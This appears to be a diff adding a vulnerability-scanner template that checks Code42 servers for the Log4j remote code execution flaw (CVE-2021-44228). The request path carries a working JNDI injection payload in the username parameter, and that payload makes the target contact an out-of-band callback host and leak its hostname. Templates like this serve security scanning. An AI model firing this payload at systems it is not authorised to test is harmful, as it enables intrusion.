@@ -1,0 +1,31 @@
+id: code42-log4j-rce
+info:
+  author: Adam Crosser
+  classification:
+    cve-id: CVE-2021-44228
+  description: Remote code execution via log4j vulnerability
+  name: Log4j Code42 RCE
+  reference:
+  - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents
+  severity: critical
+  tags: jndi,log4j,rce,cve,cve2021,oast,code42
+requests:
+- extractors:
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&url=https://localhost'
